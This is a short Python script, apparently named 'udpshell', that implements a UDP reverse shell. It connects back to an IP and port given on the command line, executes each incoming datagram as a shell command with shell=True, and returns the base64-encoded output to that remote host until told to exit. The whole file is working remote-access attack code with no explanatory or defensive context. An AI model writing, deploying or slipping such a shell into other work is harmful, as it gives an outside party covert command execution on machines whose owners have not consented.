#!/usr/bin/python

import socket
import subprocess
import sys
from random import randint
import base64

#receive data, send to popen, send back
if(len(sys.argv) < 2):
	print("Usage: ./udpshell <send_ip> <send_port>")
	exit(1)

recv_ip = "0.0.0.0"
recv_port = randint(1024, 65535)
send_ip = sys.argv[1]
send_port = int(sys.argv[2])
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
sock.bind((recv_ip, recv_port))
sock.sendto("Begin Connection id: 3242", (send_ip, send_port))

while True:
    try:
	    command, addr = sock.recvfrom(8192)
	    if(command == "exit"):
		    break
	    proc = subprocess.Popen([command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	    output = proc.stdout.read() + proc.stderr.read()
	    e = base64.encodestring(output)
	    sock.sendto(e, (send_ip, send_port))
    except socket.error:
		pass